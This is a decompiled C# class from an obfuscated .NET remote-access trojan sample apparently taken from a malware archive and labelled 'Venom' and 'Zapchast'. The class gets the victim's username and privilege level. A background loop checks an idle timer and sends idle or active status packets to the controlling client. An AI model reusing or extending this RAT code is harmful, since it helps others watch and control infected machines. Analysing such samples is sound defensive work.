// Decompiled with JetBrains decompiler
// Type: ﵉珄�蕒혪삂덧珅⠔̆㜓샄ퟥ댐晊动夯騧ꚝ길
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using xClient.Core.Packets.ClientPackets;

public static class \uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길
{
  public static 瑅翌缓픸詼漥돀䜮\uFFFD霆筥ᓖ\uF22B灌꾡䢴ﲵ\uFFFD嗆즇 LastUserStatus { get; set; }

  public static string 䝩傷攍䘴꾳\uFFFDꀷᎆ뒂戕䔬용蛞Ḧᴡ䑌껠畒軔놕() => Environment.UserName;

  public static string 頵ޔ혜श谧\uF32Bꉘ蒃ﾇ諽緃騨啋䕇䥔\u2F82\u0FF5雋顃ᓌ()
  {
    using (WindowsIdentity current = WindowsIdentity.GetCurrent())
    {
      if (current != null)
      {
        WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
        if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
          return "Admin";
        if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
          return "User";
        if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
          return "Guest";
      }
    }
    return "Unknown";
  }

  public static void \uECA1鴰ᆛ셻Ꝇ潈걳\u25CE䕄믟\uE996瘎\u2FDA穗廳ퟜṄ钃旗\uF635() => new Thread(new ThreadStart(\uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.염\uE5AF鸶\u2477婁틪\uF0A0肍덜䎼鏂Ӧᆚ\uE236ᴾ如\uF1AC攍횘䑽))
  {
    IsBackground = true
  }.Start();

  private static void 염\uE5AF鸶\u2477婁틪\uF0A0肍덜䎼鏂Ӧᆚ\uE236ᴾ如\uF1AC攍횘䑽()
  {
    while (!\uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙.Exiting)
    {
      Thread.Sleep(5000);
      if (\uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.\u0820ܓヶ䵠썪鑛䬧ﮚ買蕛㙜䞮缋ᤘẳ\u3327䫞稴ᷝጯ())
      {
        if (\uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.LastUserStatus != 瑅翌缓픸詼漥돀䜮\uFFFD霆筥ᓖ\uF22B灌꾡䢴ﲵ\uFFFD嗆즇.釅溜訤\uEAF3烙崹Ф減筰\u21E2딦蒐椶䪻퍟黾맳閳뵋仙)
        {
          \uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.LastUserStatus = 瑅翌缓픸詼漥돀䜮\uFFFD霆筥ᓖ\uF22B灌꾡䢴ﲵ\uFFFD嗆즇.釅溜訤\uEAF3烙崹Ф減筰\u21E2딦蒐椶䪻퍟黾맳閳뵋仙;
          new SetUserStatus(\uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.LastUserStatus).Execute((鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏);
        }
      }
      else if (\uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.LastUserStatus != 瑅翌缓픸詼漥돀䜮\uFFFD霆筥ᓖ\uF22B灌꾡䢴ﲵ\uFFFD嗆즇.汦䌬웞恤ꃭ팶菔ꌢ쐄册틈詝瑄䔪ﵖ教谍䅓펀㤩)
      {
        \uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.LastUserStatus = 瑅翌缓픸詼漥돀䜮\uFFFD霆筥ᓖ\uF22B灌꾡䢴ﲵ\uFFFD嗆즇.汦䌬웞恤ꃭ팶菔ꌢ쐄册틈詝瑄䔪ﵖ教谍䅓펀㤩;
        new SetUserStatus(\uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.LastUserStatus).Execute((鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏);
      }
    }
  }

  private static bool \u0820ܓヶ䵠썪鑛䬧ﮚ買蕛㙜䞮缋ᤘẳ\u3327䫞稴ᷝጯ()
  {
    long num = Stopwatch.GetTimestamp() - (long) 㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.뻮㝡ꏔ着㦟琎\uEF2E巌ⱙ뀉\uE6C9髆耰\uF2C5堀ℓ\u2EBE\uF7BC韜㣀();
    return (num > 0L ? num / 1000L : 0L) > 600L;
  }
}
